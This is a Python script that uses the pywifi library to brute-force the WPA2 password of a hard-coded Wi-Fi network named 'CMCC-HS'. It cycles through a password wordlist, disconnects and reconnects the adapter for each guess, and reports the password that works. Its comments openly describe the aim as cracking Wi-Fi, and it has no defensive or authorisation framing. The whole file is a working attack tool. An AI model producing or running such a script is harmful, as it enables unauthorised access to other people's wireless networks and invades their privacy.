# -*- coding=utf-8 -*-
#Import library
import pywifi 
from pywifi import const
import time

# Define a function to crack wifi
def wificonnect(wifiname,wifipwd):
    #Create wifi object
    wifi  = pywifi.PyWiFi()
    #Get the first chapter network card
    ifaces = wifi.interfaces()[0]
    #Disconnect the network card wifi connection
    ifaces.disconnect()
    #Sleep for 0.5 seconds
    time.sleep(0.5)
    #Judge whether the network card is disconnected
    # # Define interface status.
    #IFACE_DISCONNECTED = 0     #
    #IFACE_SCANNING = 1         #
    #IFACE_INACTIVE = 2 # The value of the network card status
    #IFACE_CONNECTING = 3       #
    #IFACE_CONNECTED = 4        #

    if ifaces.status() == const.IFACE_DISCONNECTED:#if ifaces.status() == 0: the same effect



        #Create profile object: network profile
        profile = pywifi.Profile()
        #wifi name
        profile.ssid = wifiname
        #wifiPASSWORD
        profile.key = wifipwd
        # Key management type
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        #Authentication Algorithm
        profile.auth = const.AUTH_ALG_OPEN
        #Crypto unit
        profile.cipher = const.CIPHER_TYPE_CCMP


        # Remove existing network configuration file
        ifaces.remove_all_network_profiles()
        #Add new network configuration file
        temp_profile = ifaces.add_network_profile(profile)
        #connection
        ifaces.connect(temp_profile)
        #Sleep for three seconds: try to connect
        time.sleep(3)
        # Determine the network card connection status
        if ifaces.status() == const.IFACE_CONNECTED:
            #Connect successfully return True
            return True
        else:
            #Otherwise return False
            return False
    


# Equivalent to the main function

def read_pwd():


    print('Start to crack')


    #Codebook path
    path='C:\system\Desktop\python\python_Wifi\cnpassword.txt'
    #Open the file as read-only
    file = open(path,'r')


    #As long as it is not cracked successfully, it is an endless loop
    while True:
        try:
            #Read the password one line at a time
            wifipwd = file.readline()
            # wifi name variable
            wifiname = "CMCC-HS"
            #Use the return value of the wificonnect function to determine whether to connect
            bool = wificonnect(wifiname,wifipwd)
            #Judging whether bool is True or False to determine whether the password is correct
            if bool:
                print('Password is correct',wifipwd)
                break
            else:
                print('wrong password',wifipwd)
        except:
            continue
    #Close file
    file.close()

read_pwd()



